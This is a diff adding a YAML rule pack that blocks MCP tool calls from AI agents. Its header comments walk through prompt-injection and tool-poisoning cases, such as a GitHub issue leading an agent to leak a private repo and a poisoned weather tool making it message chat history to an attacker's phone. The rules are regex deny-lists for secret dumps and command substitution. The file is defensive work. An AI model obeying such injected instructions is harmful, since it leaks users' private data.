@@ -1,0 +1,418 @@
+# =============================================================================
+# sponsio/contracts/incident/mcp-composition.yaml
+#
+# Incident pack — MCP server composition attacks.
+#
+# Real-world attacks this pack defends against, every one with a public PoC:
+#
+#   * GitHub MCP Data Heist — Invariant Labs (2025-04 / Docker blog 2025).
+#     Agent reads issues from a public repo via `mcp__github__list_issues`;
+#     issue body contains a prompt injection asking the agent to also
+#     fetch a *different*, private repo and post its contents back as a
+#     comment.  Same GitHub token covers both repos, so cross-repo
+#     escalation is silent at the API layer.  Anthropic acknowledged
+#     the pattern but declined to change protocol semantics.
+#
+#   * Cross-Server Tool Poisoning / Shadowing — Invariant Labs (2025).
+#     Server A's tool description hides instructions targeting server B
+#     (e.g. weather-MCP description tells the agent to also call
+#     `mcp__whatsapp__send_message(to=ATTACKER_PHONE, body=<chat>)`
+#     after every weather lookup).  When the agent obeys, the call goes
+#     through legit server B; the malicious origin is invisible at the
+#     call boundary.
+#
+#   * Sampling Hijack — The Hacker News (2026-04).  Malicious MCP server
+#     uses MCP's `sampling` reverse-protocol to inject prompts into the
+#     client LLM, hijacking trusted tools.  Anthropic SDK design issue
+#     across all language SDKs.
+#
+#   * Confused Deputy — Cloud Security Alliance (2025).  Server with
+#     high privileges acts on behalf of lower-privileged users; cannot
+#     differentiate between callers because user context isn't
+#     propagated through MCP.
+#
+#   * Scale: VirusTotal scanned 17,845 public MCP repos and flagged
+#     1,408 (≈8%) as likely malicious (2025-06).  Snyk ToxicSkills
+#     flagged 1,467 malicious payloads across 3,984 ClawHub/skills.sh
+#     entries (2026-02).
+#
+# Sponsio's role: deterministic backstop *after* an injection succeeded.
+# We don't try to detect prompt injection in tool descriptions (that's
+# Lakera / MCP-Scan territory).  We assume the agent decided to issue
+# a bad call; the rules below stop the call at the action boundary.
+#
+# What this bundle ships
+# ----------------------
+#
+# Two classes of rule, in priority order:
+#
+# 1. **Universal body-shape rules** (this file, §1–§2).  Fire on every
+#    matching call, no per-deployment configuration.  Block the
+#    canonical exfil idioms (KEY=VAL secret payloads, command
+#    substitution, backtick) appearing in user-visible body fields of
+#    cross-server-prone tools (GitHub issue comments, WhatsApp
+#    messages).  Always safe to include.
+#
+# 2. **Allowlist templates** (comments in §3).  These need a
+#    per-deployment list (allowed repos, allowed phone numbers, allowed
+#    filesystem paths).  Ship as documented templates the operator
+#    copies into their own `contracts:` block.  Including this bundle
+#    does NOT activate any allowlist rule by itself — that would
+#    default-deny every GitHub MCP call and break unconfigured users.
+#
+# Source tag convention:
+#   incident:mcp-composition.<rule>
+# =============================================================================
+
+version: "1"
+
+tools:
+  # GitHub MCP — github/github-mcp-server (verified naming: mcp__github__<tool>)
+  - name: mcp__github__list_issues
+    params: "owner: str, repo: str"
+  - name: mcp__github__get_issue
+    params: "owner: str, repo: str, issue_number: int"
+  - name: mcp__github__get_repo
+    params: "owner: str, repo: str"
+  - name: mcp__github__get_file_contents
+    params: "owner: str, repo: str, path: str"
+  - name: mcp__github__create_issue_comment
+    params: "owner: str, repo: str, issue_number: int, body: str"
+  - name: mcp__github__list_pulls
+    params: "owner: str, repo: str"
+  - name: mcp__github__get_pull_request_diff
+    params: "owner: str, repo: str, pull_number: int"
+
+  # WhatsApp MCP — referenced in the Invariant Labs cross-server PoC
+  - name: mcp__whatsapp__send_message
+    params: "to: str, body: str"
+  - name: mcp__whatsapp__list_messages
+    params: "chat_id: str"
+
+  # Filesystem MCP — modelcontextprotocol/server-filesystem
+  - name: mcp__filesystem__read_file
+    params: "path: str"
+
+  # Notion MCP — makenotion/notion-mcp-server.  Referenced in the
+  # 2025-09 CodeIntegrity PoC (HN top, Schneier blog) where Notion
+  # 3.0's AI agent was tricked via PDF-borne injection into
+  # exfiltrating private workspace data.  GitHub Issue #238 on the
+  # official notion-mcp-server is Notion's own acknowledgement.
+  - name: mcp__notion__create_page
+    params: "parent: object, properties: object, children: array"
+  - name: mcp__notion__update_page
+    params: "page_id: str, properties: object"
+  - name: mcp__notion__append_block_children
+    params: "block_id: str, children: array"
+  - name: mcp__notion__search
+    params: "query: str"
+
+  # GitHub Gist MCP — referenced in the "Trivial Trojans" arXiv paper
+  # (2025-07) and the GitHub MCP Heist's public-PR variant.  A public
+  # gist is internet-indexed, anonymously readable, and irrevocable
+  # in practice (it lives in archives even after delete).  This is
+  # the high-severity exfil destination for the lethal-trifecta demo.
+  - name: mcp__gh_gist__create_gist
+    params: "description: str, files: object, public: bool"
+  - name: mcp__gh_gist__update_gist
+    params: "gist_id: str, files: object"
+
+agents:
+  "*":
+    contracts:
+
+      # =====================================================================
+      # § 1 — GitHub MCP create_issue_comment body must not look like exfil
+      #
+      # The Invariant Labs Heist PoC ends with the agent posting the
+      # leaked private-repo content as a comment on a public-repo issue.
+      # Even when the read half slips through, the comment-back step is
+      # the canonical exfil channel.  We catch two body shapes:
+      #
+      #   (a) Three+ `KEY=VALUE` pairs — characteristic of someone
+      #       echoing environment / config dumps into a comment.  Single
+      #       `KEY=VAL` (e.g. one URL or one config flag) does NOT trip.
+      #   (b) Any command substitution (`$(...)` or backtick) — strongly
+      #       suggests the agent is echoing executed-shell output.
+      # =====================================================================
+
+      - desc: "GitHub MCP comment body must not contain ≥3 KEY=VAL secret-shape pairs"
+        E:
+          pattern: arg_blacklist
+          args:
+            - mcp__github__create_issue_comment
+            - body
+            - ['(?:[A-Z][A-Z0-9_]+=[^\s,;]{6,}.*?){3,}']
+          source: "incident:mcp-composition.github_comment_no_secret_shape"
+
+      - desc: "GitHub MCP comment body must not contain command substitution"
+        E:
+          pattern: arg_blacklist
+          args:
+            - mcp__github__create_issue_comment
+            - body
+            - ['\$\([^)]*\)', '`[^`]+`']
+          source: "incident:mcp-composition.github_comment_no_subst"
+
+      # =====================================================================
+      # § 2 — WhatsApp MCP message body must not look like exfil
+      #
+      # The Invariant Labs WhatsApp PoC: poisoned weather-MCP description
+      # induces the agent to call `mcp__whatsapp__send_message` with the
+      # user's chat history disguised as a weather summary.  Same body-
+      # shape defenses as §1.
+      # =====================================================================
+
+      - desc: "WhatsApp MCP message body must not contain ≥3 KEY=VAL secret-shape pairs"
+        E:
+          pattern: arg_blacklist
+          args:
+            - mcp__whatsapp__send_message
+            - body
+            - ['(?:[A-Z][A-Z0-9_]+=[^\s,;]{6,}.*?){3,}']
+          source: "incident:mcp-composition.whatsapp_body_no_secret_shape"
+
+      - desc: "WhatsApp MCP message body must not contain command substitution"
+        E:
+          pattern: arg_blacklist
+          args:
+            - mcp__whatsapp__send_message
+            - body
+            - ['\$\([^)]*\)', '`[^`]+`']
+          source: "incident:mcp-composition.whatsapp_body_no_subst"
+
+      # =====================================================================
+      # § 3 — Notion MCP "lethal trifecta" defense
+      #
+      # CodeIntegrity (Sep 2025) showed Notion 3.0's AI agent could be
+      # induced to copy private workspace content to attacker-controlled
+      # destinations via PDF-borne prompt injection.  Schneier covered
+      # it; HN ran the post for a day; PromptArmor labelled the same
+      # primitive "unpatched data exfiltration".
+      #
+      # Pattern (Simon Willison's "lethal trifecta"):
+      #   1. Agent has access to private content (local files / pages)
+      #   2. Agent processes untrusted content (PDF / page / shared note)
+      #   3. Agent has external comms (Notion write to ANY workspace,
+      #      web_search, …)
+      # All three together = structural data theft via prompt injection.
+      #
+      # Sponsio's role: stateless body-shape + workspace allowlist
+      # (universal-rules half) and trace-aware filesystem→notion-write
+      # confinement (allowlist-templates half).  We can't detect the
+      # injection itself — we deny the resulting cross-trust write
+      # at the action boundary.
+      # =====================================================================
+
+      - desc: "Notion create_page children must not contain ≥3 KEY=VAL secret-shape pairs"
+        E:
+          pattern: arg_blacklist
+          args:
+            - mcp__notion__create_page
+            - children
+            - ['(?:[A-Z][A-Z0-9_]+=[^\s,;]{6,}.*?){3,}']
+          source: "incident:mcp-composition.notion_create_no_secret_shape"
+
+      - desc: "Notion append_block_children must not contain ≥3 KEY=VAL secret-shape pairs"
+        E:
+          pattern: arg_blacklist
+          args:
+            - mcp__notion__append_block_children
+            - children
+            - ['(?:[A-Z][A-Z0-9_]+=[^\s,;]{6,}.*?){3,}']
+          source: "incident:mcp-composition.notion_append_no_secret_shape"
+
+      - desc: "Notion create_page children must not contain command substitution"
+        E:
+          pattern: arg_blacklist
+          args:
+            - mcp__notion__create_page
+            - children
+            - ['\$\([^)]*\)', '`[^`]+`']
+          source: "incident:mcp-composition.notion_create_no_subst"
+
+      # =====================================================================
+      # § 3b — GitHub Gist MCP "lethal trifecta" exfil defense
+      #
+      # "Trivial Trojans" (arXiv 2507.19880, 2025-07): a minimal
+      # malicious MCP server steals banking data via webhook.site or
+      # a public gist.  GitGuardian (2026-04) measured 28.6M secrets
+      # leaked through public GitHub commits in 2025 (+34% YoY) — the
+      # public-Gist exfil channel is the dominant real-world leak
+      # surface for AI agents in 2026.
+      #
+      # A public gist is:
+      #   - internet-indexed (Google sees it within hours)
+      #   - anonymously readable (no GitHub account needed)
+      #   - effectively irrevocable (web archives mirror them in
+      #     minutes; a delete on the GitHub side doesn't pull from
+      #     archive.org)
+      #
+      # We block universal exfil shapes (KEY=VAL, $(...) substitution),
+      # plus three sensitive-content patterns that are almost always
+      # exfil signals when present in a gist file: salary amounts,
+      # employment-termination keywords, and named-customer ARR figures.
+      # The patterns deliberately allow single mentions (e.g. one
+      # salary band as a reference) and only fire when ≥2 instances
+      # cluster — typical of a leaked employee-list or customer-list.
+      # =====================================================================
+
+      - desc: "Gist files content must not contain ≥3 KEY=VAL secret-shape pairs"
+        E:
+          pattern: arg_blacklist
+          args:
+            - mcp__gh_gist__create_gist
+            - files
+            - ['(?:[A-Z][A-Z0-9_]+=[^\s,;]{6,}.*?){3,}']
+          source: "incident:mcp-composition.gist_no_secret_shape"
+
+      - desc: "Gist files content must not contain command substitution"
+        E:
+          pattern: arg_blacklist
+          args:
+            - mcp__gh_gist__create_gist
+            - files
+            - ['\$\([^)]*\)', '`[^`]+`']
+          source: "incident:mcp-composition.gist_no_subst"
+
+      - desc: "Gist files content must not contain ≥2 salary amounts (typical employee-list leak)"
+        E:
+          pattern: arg_blacklist
+          args:
+            - mcp__gh_gist__create_gist
+            - files
+            - ['(?:\$[0-9]{2,3}[,k][0-9]{0,3}.*?){2,}']
+          source: "incident:mcp-composition.gist_no_multi_salary"
+
+      - desc: "Gist files content must not contain employment-termination language (PIP / fired / exit-by)"
+        E:
+          pattern: arg_blacklist
+          args:
+            - mcp__gh_gist__create_gist
+            - files
+            - ['\b(PIP|performance improvement plan|terminat\w*|exit by|let go|fired|severance package)\b']
+          source: "incident:mcp-composition.gist_no_termination_lang"
+
+      - desc: "Gist files content must not contain ≥2 customer ARR/MRR figures (customer-list leak)"
+        E:
+          pattern: arg_blacklist
+          args:
+            - mcp__gh_gist__create_gist
+            - files
+            - ['(?:\$[0-9]+[,.]?[0-9]*\s*[kKmM]?\s*(?:ARR|MRR).*?){2,}']
+          source: "incident:mcp-composition.gist_no_multi_arr"
+
+      # =====================================================================
+      # § 4 — Allowlist templates (NOT ACTIVE — copy into your sponsio.yaml)
+      #
+      # The rules below are templates.  Including this bundle does NOT
+      # enable them; you'd need to copy them into your local `contracts:`
+      # block and replace the placeholder regex with your real allowlist.
+      #
+      # ---------------------------------------------------------------------
+      # 4a. GitHub MCP repo allowlist (defends against the Data Heist's
+      # cross-repo escalation step).  Replace `<your-org>/(<repo-1>|<repo-2>)`
+      # with your org's allowed repos.
+      # ---------------------------------------------------------------------
+      #
+      # contracts:
+      #   - desc: "GitHub MCP get_repo: repo arg restricted to my allowlist"
+      #     E:
+      #       ltl: 'G(called(mcp__github__get_repo) -> arg_field_has(mcp__github__get_repo, repo, "^(my-org/public-repo|my-org/intended-repo)$"))'
+      #
+      #   - desc: "GitHub MCP get_file_contents: repo arg restricted to my allowlist"
+      #     E:
+      #       ltl: 'G(called(mcp__github__get_file_contents) -> arg_field_has(mcp__github__get_file_contents, repo, "^(my-org/public-repo|my-org/intended-repo)$"))'
+      #
+      #   - desc: "GitHub MCP create_issue_comment: target repo restricted to my allowlist"
+      #     E:
+      #       ltl: 'G(called(mcp__github__create_issue_comment) -> arg_field_has(mcp__github__create_issue_comment, repo, "^(my-org/public-repo|my-org/intended-repo)$"))'
+      #
+      # ---------------------------------------------------------------------
+      # 4b. WhatsApp MCP recipient allowlist (defends against cross-server
+      # description poisoning + attacker-phone exfil).  Replace
+      # `\\+1415555XXXX` with your allowed contacts.
+      # ---------------------------------------------------------------------
+      #
+      # contracts:
+      #   - desc: "WhatsApp MCP send_message: recipient restricted to my allowlist"
+      #     E:
+      #       ltl: 'G(called(mcp__whatsapp__send_message) -> arg_field_has(mcp__whatsapp__send_message, to, "^\\+1415555[0-9]{4}$"))'
+      #
+      # ---------------------------------------------------------------------
+      # 4c. Filesystem MCP workspace scope (defends against cross-server
+      # data-flow attacks that bridge filesystem reads into outbound MCP
+      # calls).  Replace `/workspace/project/.*` with your allowed paths.
+      # ---------------------------------------------------------------------
+      #
+      # contracts:
+      #   - desc: "Filesystem MCP read_file: path restricted to my workspace"
+      #     E:
+      #       ltl: 'G(called(mcp__filesystem__read_file) -> arg_field_has(mcp__filesystem__read_file, path, "^/workspace/project/.*"))'
+      #
+      # ---------------------------------------------------------------------
+      # 4d. Notion MCP workspace allowlist (defends against the lethal-
+      # trifecta exfil where private workspace content is copied to an
+      # attacker-controlled workspace).  Find your workspace IDs in the
+      # Notion API response or the URL of any workspace page; replace
+      # the regex below with the IDs you intend the agent to write to.
+      # ---------------------------------------------------------------------
+      #
+      # contracts:
+      #   - desc: "Notion MCP create_page: parent workspace restricted to my allowlist"
+      #     E:
+      #       ltl: 'G(called(mcp__notion__create_page) -> arg_field_has(mcp__notion__create_page, parent, "(workspace_id|database_id)\":\\s*\"(my-workspace-id-1|my-workspace-id-2)\""))'
+      #
+      #   - desc: "Notion MCP update_page: page must be in my workspace allowlist"
+      #     E:
+      #       ltl: 'G(called(mcp__notion__update_page) -> arg_field_has(mcp__notion__update_page, page_id, "^(my-page-id-1|my-page-id-2)$"))'
+      #
+      # ---------------------------------------------------------------------
+      # 4e. Trace-aware "lethal trifecta" defense — after the agent has
+      # *read* untrusted local content (e.g. a markdown note containing
+      # an injection in an HTML comment), confine subsequent Notion
+      # writes to the operator's narrow allowlist.  Belt-and-suspenders
+      # over 4d: even if 4d's allowlist is broad, this rule activates
+      # only after a Read happens and tightens further.  Uses
+      # ``activate_at: first_match`` so events before the Read are
+      # unaffected.
+      # ---------------------------------------------------------------------
+      #
+      # contracts:
+      #   - desc: "After reading local notes, Notion writes confined to my own workspace"
+      #     activate_at: first_match
+      #     A:
+      #       ltl: 'F(arg_field_has(Read, file_path, "(^|/)\\.md$|/notes/"))'
+      #     E:
+      #       ltl: 'G(called(mcp__notion__create_page) -> arg_field_has(mcp__notion__create_page, parent, "\"(my-workspace-id-1|my-workspace-id-2)\""))'
+      #
+      # ---------------------------------------------------------------------
+      # 4f. GitHub Gist privacy enforcement — gists must be private only.
+      # Public gists are internet-indexed and anonymously readable.
+      # Even within `public: false`, the universal §3b rules above
+      # block exfil-shaped content; this rule closes the visibility
+      # half of the threat model.  See "Trivial Trojans" (arXiv) and
+      # GitGuardian's 2026 leaked-secrets count for motivation.
+      # ---------------------------------------------------------------------
+      #
+      # contracts:
+      #   - desc: "GitHub Gist must be private (public: false)"
+      #     E:
+      #       ltl: 'G(called(mcp__gh_gist__create_gist) -> arg_field_has(mcp__gh_gist__create_gist, public, "false"))'
+      #
+      # ---------------------------------------------------------------------
+      # 4g. Trace-aware lethal-trifecta for Gist — after reading any
+      # local notes, Gists must be private only.  Combined with §3b's
+      # body-shape rules (always-on), this gives full coverage of the
+      # "agent reads notes → exfils via gist" composition chain.
+      # ---------------------------------------------------------------------
+      #
+      # contracts:
+      #   - desc: "After reading local notes, Gist must be private"
+      #     activate_at: first_match
+      #     A:
+      #       ltl: 'F(called(Read))'
+      #     E:
+      #       ltl: 'G(called(mcp__gh_gist__create_gist) -> arg_field_has(mcp__gh_gist__create_gist, public, "false"))'
+      #
+      # =====================================================================
